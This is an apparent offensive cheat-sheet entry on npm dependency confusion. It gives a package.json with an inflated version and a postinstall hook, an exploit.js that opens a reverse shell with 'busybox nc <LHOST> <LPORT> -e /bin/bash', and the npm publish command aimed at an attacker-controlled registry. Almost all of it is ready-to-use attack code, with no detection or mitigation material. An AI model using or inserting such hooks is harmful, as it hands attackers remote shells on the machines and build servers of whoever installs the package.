# npm Dependency Confusion (Postinstall RCE)

If you can get a target's package manager to resolve against a registry you control (DNS poisoning of the registry hostname, a configured private registry you can publish to), publish a package with the same name as an internal dependency and a malicious `postinstall` hook.

```json
{
  "name": "<internal-package-name>",
  "version": "99.0.0",
  "scripts": { "postinstall": "node ./exploit.js" }
}
```
```js
// exploit.js
require('child_process').exec('busybox nc <LHOST> <LPORT> -e /bin/bash');
```
```bash
npm publish --registry <attacker-controlled-registry-url>
# trigger the target's normal install/reinstall process
```
